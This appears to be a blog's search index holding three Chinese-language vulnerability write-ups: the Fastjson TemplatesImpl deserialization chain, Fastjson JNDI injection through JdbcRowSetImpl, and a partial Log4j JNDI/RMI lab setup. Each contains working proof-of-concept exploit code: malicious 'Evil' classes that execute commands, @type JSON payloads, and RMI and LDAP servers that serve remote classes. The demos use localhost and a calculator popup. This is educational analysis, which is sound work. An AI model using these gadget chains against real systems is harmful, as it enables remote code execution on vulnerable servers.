<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Fastjson_TemplatesImpl</title>
    <url>/2025/03/13/Fastjson-TemplatesImpl/</url>
    <content><![CDATA[<h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>这里利用的了TemplatesImpl的类，可以联想到CC3里面利用方式，将TemplatesImpl这个类，实例化的时候传入我们的恶意字节码，然后他会将我们的恶意字节码当成类去实例化然后调用静态方法。</p>
<p><strong>这里先教大家怎么转换恶意类的字节码，原因是网上很多都是已经写好的poc，那他的恶意类执行的方法就是Runtime.getRuntime.exec(“calc”) ，这个如果是windows系统就可以正常执行命令，但是如果是我们的mac系统呢。我们弹出计算器需要的命令是 open -a Calculator ,所以我们就需要去修改恶意类里面的字节码，以后我们学习的时候也方便许多</strong> </p>
<h3 id="class文件转换为字节码"><a href="#class文件转换为字节码" class="headerlink" title="class文件转换为字节码"></a>class文件转换为字节码</h3><h4 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil extends AbstractTranslet &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里面恶意类继承了AbstractTranslet类，此时可以带着疑问看一下，CC3的时候也有了解</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/1732247379749-eb615db2-03fa-46b9-9f18-360b5dfbac6c.png"
                      class=""
                > 

<p>可以先看这张图，就是告诉我们为什么要继承AbstractTranslet</p>
<h3 id="类转换为字节码"><a href="#类转换为字节码" class="headerlink" title="类转换为字节码"></a>类转换为字节码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class Read_class_bytes &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        byte[] bytes = Files.readAllBytes(Paths.get(&quot;target/classes/Evil.class&quot;));</span><br><span class="line">        System.out.println(new String(bytes));</span><br><span class="line">        System.out.println(&quot;------------------------------------------------------------------------------------------------------------&quot;);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bytes));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>记住这里路径读取的是target目录下的class</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313174419129.png"
                      class="" title="image-20250313174419129"
                > 

<p><em>这里为什么要用到base64去编码我们的字节码呢，我们先参考文章来看，然后在调试中看看是不是这么回事</em> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313175436060.png"
                      class="" title="image-20250313175436060"
                > 

<p>看一下代码里面</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313175506767.png"
                      class="" title="image-20250313175506767"
                > 

<p>如果我们的lexer为JSONScanner的话</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313175546681.png"
                      class="" title="image-20250313175546681"
                > 

<p>就会调用它的bytesValue，所以就会进行base64解码</p>
<p>这只是初步了解，实际情况我们以调试为准。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>创建一个maven项目</li>
<li>准备一个恶意类和一个漏洞利用的代码</li>
<li>maven配置fastjson版本，JDK我是高版本一样可以执行命令</li>
</ul>
<p>maven配置</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<p>漏洞利用代码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class Fastjson_TemplatesImpl &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        ParserConfig config = new ParserConfig();</span><br><span class="line">        byte[] bytes = Files.readAllBytes(Paths.get(&quot;target/classes/Evil.class&quot;));</span><br><span class="line">        String base64EncodedBytes = Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        String text = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot; + base64EncodedBytes + &quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;;</span><br><span class="line">        JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>初步运行在代码</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313180130091.png"
                      class="" title="image-20250313180130091"
                > 

<p>这里代码为什么要<em>JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</em> 搞那么复杂</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313180240134.png"
                      class="" title="image-20250313180240134"
                > 

<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p><strong>fastjson反序列化漏洞的利用方式从JdbcRowSetImpl可以看出就是他会实例化我们指定的对象，然后调用getter或者setter方法</strong> 网上大部分的文章都直接分析一些特殊的点，但是我们不知道TemplatesImpl里面会走哪些函数，就是怎么走的。</p>
<h3 id="猜测分析"><a href="#猜测分析" class="headerlink" title="猜测分析"></a>猜测分析</h3><p>从实例化的时候会调用getter或者setter方法，以及初始化的无参构造函数看看</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313184436063.png"
                      class="" title="image-20250313184436063"
                > 

<p>无参构造函数，可以打上断点看看会不会走到这，这里给_bytecodes我们的恶意字节码赋值了哦</p>
<p>然后从CC3的链子可知漏洞触发的点是这个函数definclass</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313184542985.png"
                      class="" title="image-20250313184542985"
                > 

<p>也可以打上断点</p>
<p><strong>找哪里调用了defineClass</strong> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313184634203.png"
                      class="" title="image-20250313184634203"
                > 

<p>那我们就要找defineTransletClasses  <strong>一层一层往上找原因是肯定有一个setter方法或者getter方法里面一步一步调用这些函数到触发漏洞点的</strong> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313184749244.png"
                      class="" title="image-20250313184749244"
                > 

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190343258.png"
                      class="" title="image-20250313190343258"
                > 

<p>这里有三个，都可以打上断点，都是get方法。所以我们可以调试一下了</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>TemplatesImpl这个类里面的方法</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190545878.png"
                      class="" title="image-20250313190545878"
                > 

<p>跟进newTransformer()</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190634787.png"
                      class="" title="image-20250313190634787"
                > 

<p>跟进getTransletInstance()</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190714628.png"
                      class="" title="image-20250313190714628"
                > 

<p>getTransletInstance 这个方法里面有defineTransletClasses，这里面可以知道我们想要进入defineTransletClasses，我们就需要满足</p>
<ul>
<li>_name!&#x3D;null</li>
<li>_class&#x3D;&#x3D;null</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190821863.png"
                      class="" title="image-20250313190821863"
                > 

<p>这里可以知道我们的_bytecodes就是恶意字节码不能为null</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313190947571.png"
                      class="" title="image-20250313190947571"
                > 

<p>然后就走到我们加载恶意类的地方</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313191045652.png"
                      class="" title="image-20250313191045652"
                > 

<p>走到我们的恶意类调用静态方法。</p>
<h3 id="分析poc"><a href="#分析poc" class="headerlink" title="分析poc"></a>分析poc</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313192102984.png"
                      class="" title="image-20250313192102984"
                > 

<ul>
<li>@type，是为了实例化TemplatesImpl这个函数并且调用它的类函数</li>
<li>_bytecodes是放恶意字节码让我们后面可以defineclass(_bytecodes)，加载恶意类</li>
<li>_name 是上面为了绕过if判断，if为空就不进那个判断语句</li>
<li>_tfactory是为了能让代码继续走下去不会报错<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/1732247023186-6249d5fc-fbbb-491a-9123-2fd4265bb436-20250313192358337.png"
                      class=""
                > </li>
<li>_outputProperties这个属性就是为了反序列化的时候自动调用getter方法，他会拼接get+outputProperties&#x3D;getoutputProperties的方法进行调用，从而执行我们的利用链</li>
</ul>
]]></content>
      <categories>
        <category>漏洞原理分析</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson_JNDI</title>
    <url>/2025/03/12/Fastjson-jndi/</url>
    <content><![CDATA[<h1 id="Fastjson的JNDI利用"><a href="#Fastjson的JNDI利用" class="headerlink" title="Fastjson的JNDI利用"></a>Fastjson的JNDI利用</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>创建一个maven项目</li>
<li>导入所需要的fastjson的漏洞版本的包</li>
<li>高版本的jdk也可以，低版本也可以，高版本需要设置trustUrlCodebase为true</li>
</ul>
<p>需要导入的maven依赖</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">public class gadget &#123;</span><br><span class="line"></span><br><span class="line">    public static class test&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br><span class="line">        //JDK高版本需要设置trustUrlCodebase为true，不然不会远程访问我们的恶意类</span><br><span class="line">        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Evil\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="搭建ldap服务"><a href="#搭建ldap服务" class="headerlink" title="搭建ldap服务"></a>搭建ldap服务</h3><h4 id="自写恶意类"><a href="#自写恶意类" class="headerlink" title="自写恶意类"></a>自写恶意类</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行后会在target&#x2F;classes底下生成恶意类</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312185947637.png"
                      class="" title="image-20250312185947637"
                > 

<h4 id="ldap恶意服务搭建"><a href="#ldap恶意服务搭建" class="headerlink" title="ldap恶意服务搭建"></a>ldap恶意服务搭建</h4><p>去到我们这个evil所在目录下起一个web服务</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312190100351.png"
                      class="" title="image-20250312190100351"
                > 

<p><strong>python3 -m http.server 8899</strong> </p>
<p>然后我们用这个工具起一个ldap</p>
<p><a class="link"   href="https://github.com/RandomRobbieBF/marshalsec-jar/blob/master/marshalsec-0.0.3-SNAPSHOT-all.jar" >https://github.com/RandomRobbieBF/marshalsec-jar/blob/master/marshalsec-0.0.3-SNAPSHOT-all.jar<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><strong>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “<a class="link"   href="http://127.0.0.1:8899/#Evil" >http://127.0.0.1:8899/#Evil<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>“</strong> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312190208040.png"
                      class="" title="image-20250312190208040"
                > 

<h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>选择这个类作为漏洞类的原因是</p>
<p>fastjson反序列化的时候会自动调用setter方法去给我们的属性赋值</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312192102668.png"
                      class="" title="image-20250312192102668"
                > 

<p>如果他自动调用了setAutoCommit，然后里面有个connect函数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312192328524.png"
                      class="" title="image-20250312192328524"
                > 

<p>这里面有个nitialContext.lookup(this.getDataSourceName())函数，如果this.getDataSourceName()可以控制为jndi注入的两个协议的话，我们就可以实现fastjson反序列化打jndi</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>运行我们的反序列化代码</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312190345419.png"
                      class="" title="image-20250312190345419"
                >

<p>弹出了计算器，虽然他报错了</p>
<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>在parse函数上打上断点</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312190635856.png"
                      class="" title="image-20250312190635856"
                > 

<p>单步调试进入函数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312190715327.png"
                      class="" title="image-20250312190715327"
                > 

<h3 id="DefaultJSONParser"><a href="#DefaultJSONParser" class="headerlink" title="DefaultJSONParser"></a>DefaultJSONParser</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312190841821.png"
                      class="" title="image-20250312190841821"
                > 

<p>会进行一个jsonscanner的扫描</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312190958548.png"
                      class="" title="image-20250312190958548"
                > 

<p>可以看到我们的参数给赋值</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312191056318.png"
                      class="" title="image-20250312191056318"
                > 

<h3 id="parser-parse"><a href="#parser-parse" class="headerlink" title="parser.parse()"></a>parser.parse()</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312191214470.png"
                      class="" title="image-20250312191214470"
                > 

<p>会有个根据我们之前的lexer的token进行选择</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312191301097.png"
                      class="" title="image-20250312191301097"
                > 

<p>走到case 12这里</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312191318133.png"
                      class="" title="image-20250312191318133"
                > 

<h3 id="this-parseObject-Map-object-fieldName"><a href="#this-parseObject-Map-object-fieldName" class="headerlink" title="this.parseObject((Map)object, fieldName);"></a>this.parseObject((Map)object, fieldName);</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312191536547.png"
                      class="" title="image-20250312191536547"
                > 

<p>这里可以看到关键的可控制类的@type和typename在这里面，然后去加载这个JdbcRowSetImpl这个类</p>
<p>然后会走到反序列化的地方</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312191713588.png"
                      class="" title="image-20250312191713588"
                > 

<p>然后这里好像会跑到ASM上？不是很懂，调试不了，所以后续将断点打在我们的调用类上面</p>
<p><strong>这里直接不调试，直接放行到后续我们打的断点处</strong> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312193039948.png"
                      class="" title="image-20250312193039948"
                > 

<h3 id="JdbcRowSetImpl-1"><a href="#JdbcRowSetImpl-1" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312193001203.png"
                      class="" title="image-20250312193001203"
                > 

<p>然后就可以发现确实调用了set方法给我们的参数赋值，然后又因为var1为true，var1是在这里设置的true</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312193142325.png"
                      class="" title="image-20250312193142325"
                > 

<p>后续我们进入connect</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312193247029.png"
                      class="" title="image-20250312193247029"
                > 

<p>我们可以看一下getDataSourceName的参数长什么样</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312193336054.png"
                      class="" title="image-20250312193336054"
                > 

<p>就是我们的ldap协议的恶意类地址</p>
<p>后续不细调了，跟前面的文章ldap一样的，走了多重的lookup函数最后我们的恶意类加载，跳过一些步骤</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312193809716.png"
                      class="" title="image-20250312193809716"
                > 

<p>因为是ldap协议与前面rmi协议有些不一样，带着大家跟一下，可以一步一步使用二分的方法，如果哪里弹出了计算器，说明那个地方的函数实现了最终漏洞点，然后打上断点在单步调试进去看</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312193957296.png"
                      class="" title="image-20250312193957296"
                > 

<p>最后走到了漏洞触发点</p>
<p>DirectoryManager.getObjectInstance</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312194343089.png"
                      class="" title="image-20250312194343089"
                > 

<p>获取我们的类的实例</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312194553473.png"
                      class="" title="image-20250312194553473"
                > 

<p>这里loadclass加载我们的恶意类</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312194656230.png"
                      class="" title="image-20250312194656230"
                > 

<p>最后给我们的恶意类的静态方法打上断点</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312194825500.png"
                      class="" title="image-20250312194825500"
                > 

<p>发现走到了这里，并且弹出了计算器</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/12/Fastjson-jndi/image-20250312194841197.png"
                      class="" title="image-20250312194841197"
                >  



















]]></content>
      <categories>
        <category>漏洞原理分析</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>Log4j漏洞分析</title>
    <url>/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
<li>rmi服务端</li>
<li>rmi客户端</li>
<li>恶意类的实现</li>
<li>idea+jdk1.8.0_441</li>
</ul>
<h2 id="pom-xml导入依赖"><a href="#pom-xml导入依赖" class="headerlink" title="pom.xml导入依赖"></a>pom.xml导入依赖</h2><p>正常可以使用maven</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.9.0&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></div>
<p>但是我使用的阿里云的maven配置，所以一直远程拉取不了，这里介绍本地配置依赖的方法<br>访问<a class="link"   href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.9.0" >https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.9.0<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311110830202.png"
                      class="" title="image-20250311110830202"
                >

<p>创建一个lib目录将依赖放进去</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311110902143.png"
                      class="" title="image-20250311110902143"
                > 

<p>然后pom.xml里面配置</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.9.0&lt;/version&gt;</span><br><span class="line">            &lt;systemPath&gt;$&#123;project.basedir&#125;/lib/log4j-core-2.9.0.jar&lt;/systemPath&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="服务端代码实现"><a href="#服务端代码实现" class="headerlink" title="服务端代码实现"></a>服务端代码实现</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line"></span><br><span class="line">public class log4j_server &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(12345);</span><br><span class="line">        //创建一个注册表且端口为12345</span><br><span class="line">        Reference reference = new Reference(&quot;Evil&quot;, &quot;Evil&quot;,</span><br><span class="line">                &quot;http://127.0.0.1:8080/&quot;);</span><br><span class="line">        //创建Reference对象，类名为Evil，工厂类名为Evil</span><br><span class="line">        ReferenceWrapper wrapper = new ReferenceWrapper(reference);</span><br><span class="line">        //使用ReferenceWrapper包装Reference对象</span><br><span class="line">        registry.bind(&quot;remote&quot;, wrapper);</span><br><span class="line">        //将包装好的对象绑定到注册表中并设置名称为remote</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111035431.png"
                      class="" title="image-20250311111035431"
                >

<h2 id="客户端代码实现"><a href="#客户端代码实现" class="headerlink" title="客户端代码实现"></a>客户端代码实现</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mport javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class Log4j_client &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        //System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br><span class="line">        // 这里先注释掉，这里是高版本jdk的防范机制，对url默认不信任，然后无法复现成功</span><br><span class="line">        InitialContext initialContext=new InitialContext();</span><br><span class="line">        // 创建一个JNDI InitialContext实例，用于访问JNDI服务</span><br><span class="line">        initialContext.lookup(&quot;rmi://127.0.0.1:12345/remote&quot;);</span><br><span class="line">        // 尝试连接远程主机</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111158954.png"
                      class="" title="image-20250311111158954"
                > 

<h2 id="恶意类Evil"><a href="#恶意类Evil" class="headerlink" title="恶意类Evil"></a>恶意类Evil</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.Name;</span><br><span class="line">import javax.naming.spi.ObjectFactory;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Evil implements ObjectFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111254962.png"
                      class="" title="image-20250311111254962"
                > 

